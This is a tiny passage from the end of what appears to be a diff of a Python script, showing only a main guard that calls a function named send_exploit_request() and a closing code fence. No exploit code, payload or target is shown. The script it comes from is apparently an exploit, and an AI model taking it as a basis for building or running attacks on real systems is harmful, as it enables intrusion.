+if __name__ == "__main__": 
+
+    send_exploit_request()
 ```
 
 
